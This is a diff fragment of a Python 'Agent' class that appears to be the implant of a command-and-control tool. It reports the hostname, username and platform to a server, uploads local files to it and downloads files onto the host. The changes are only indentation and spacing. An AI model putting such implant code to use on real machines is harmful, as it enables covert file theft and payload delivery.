@@ -92,7 +92,7 @@ class Agent(object):
     def server_hello(self):
         """ Ask server for instructions """
         req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
-        json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
+            json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
         return req.text
 
     def send_output(self, output, newlines=True):
@@ -161,7 +161,7 @@ class Agent(object):
             if os.path.exists(file) and os.path.isfile(file):
                 self.send_output("[*] Uploading %s..." % file)
                 requests.post(config.SERVER + '/api/' + self.uid + '/upload',
-                files={'uploaded': open(file, 'rb')})
+                    files={'uploaded': open(file, 'rb')})
             else:
                 self.send_output('[!] No such file: ' + file)
         except Exception as exc:
@@ -171,9 +171,9 @@ class Agent(object):
     def download(self, file, destination=''):
         """ Downloads a file the the agent host through HTTP(S) """
         try:
-            destination= self.expand_path(destination)
+            destination = self.expand_path(destination)
             if not destination:
-                destination = file.split('/')[-1]
+                destination= file.split('/')[-1]
             self.send_output("[*] Downloading %s..." % file)
             req = requests.get(file, stream=True)
             with open(destination, 'wb') as f:
